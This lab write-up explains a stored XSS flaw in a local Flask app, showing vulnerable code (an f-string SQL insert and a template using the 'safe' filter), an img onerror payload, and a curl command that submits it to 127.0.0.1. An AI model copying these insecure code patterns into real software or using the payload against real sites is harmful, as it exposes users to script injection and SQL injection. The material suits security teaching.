# stored xss: html and javascript saved in a post

## what the bug is

`/upload` accepts a title and content, then inserts both values into the `posts` table. the relevant insert is built with an f string:

```python
sql_query = f"INSERT INTO posts (title, content, user_id) VALUES ('{title}', '{content}', {user_id})"
cursor.execute(sql_query)
db.commit()
```

later, `/see` renders the stored values with `safe`:

```html
<h3>{{ post.title | safe}}</h3>
<p>{{ post.content | safe }}</p>
```

jinja normally escapes characters such as `<` and `>` before putting user input into HTML. `safe` disables that escaping for this value. the browser therefore receives the stored content as markup rather than as text.

the vulnerability is stored xss because the payload is saved first and executes later for every logged in user who opens `/see`.

## normal data flow

with a harmless post, the browser submits:

```http
POST /upload HTTP/1.1
Host: 127.0.0.1:5000
Cookie: session=<attacker's signed flask session cookie>
Content-Type: application/x-www-form-urlencoded

title=hello&content=ordinary+text
```

flask reads the form values and creates SQL similar to:

```sql
INSERT INTO posts (title, content, user_id)
VALUES ('hello', 'ordinary text', 3);
COMMIT;
```

on a later request, the application runs:

```sql
SELECT * FROM posts ORDER BY created_at DESC;
```

the template inserts the returned content into the response. that is the point where stored data becomes browser markup.

## html injection evidence

create a post with this content:

```html
<b>bold</b>
```

the database stores the characters `<b>bold</b>`. the `/see` response contains those same characters:

```html
<p><b>bold</b></p>
```

the browser parses the `b` element and displays `bold` in bold. if autoescaping were active, the response would instead contain escaped characters such as:

```html
<p>&lt;b&gt;bold&lt;/b&gt;</p>
```

this is the first useful trace because it proves that the stored value crosses the template boundary without HTML escaping.

## stored JavaScript execution

the same input path accepts an event handler such as:

```html
<img src="x" onerror="alert(1)">
```

the request stores the payload in the database. when `/see` is opened, the response includes:

```html
<p><img src="x" onerror="alert(1)"></p>
```

the browser tries to load `x`. the load fails, which dispatches the image's `error` event. the inline handler runs and calls `alert(1)`. no console command and no click are needed.

the execution chain is:

```text
POST /upload
  -> request.form["content"]
  -> INSERT into posts.content
  -> SELECT from posts on GET /see
  -> {{ post.content | safe }}
  -> browser parses img element
  -> image error event runs JavaScript
```

## reproducible request

the payload can be submitted from the local lab with:

```bash
curl -i -b attacker.cookies -X POST http://127.0.0.1:5000/upload \\
  --data-urlencode 'title=stored payload' \\
  --data-urlencode 'content=<img src="x" onerror="alert(1)">'
```

the upload route commits the row and returns:

```http
HTTP/1.1 200 OK

Post created successfully!
```

when a second logged in user requests `/see`, the server returns the stored markup in the HTML response. the second user's browser then executes the handler in that user's origin and session context.

## why the second user is affected

the database does not know that the content is meant to be harmless text. it stores the payload as ordinary post content. every later `/see` response includes it, so each viewer's browser becomes the execution environment.

this is different from a reflected xss payload, which normally travels in one crafted request and is reflected immediately without being saved. stored xss persists until the post is removed.

## security impact

the harmless `alert(1)` proves JavaScript execution. a real attacker could replace the alert with code that changes the page, sends requests as the viewer, or reads data available to JavaScript in the application's origin. for this local lab, keep demonstrations scoped to `127.0.0.1` and use visible proof such as `alert(1)`.

## verification checklist

| check | result |
|---|---|
| stored `<b>bold</b>` renders as formatted HTML | confirmed when the response contains unescaped markup |
| stored event handler executes | confirmed by `alert(1)` after `/see` loads |
| the payload must be clicked | no, the image error event is automatic |
| the payload is stored before execution | yes, it is inserted into `posts.content` |
| a second viewer receives the payload | yes, `/see` selects and renders the same row |
| post content is escaped before rendering | no, `| safe` disables escaping |
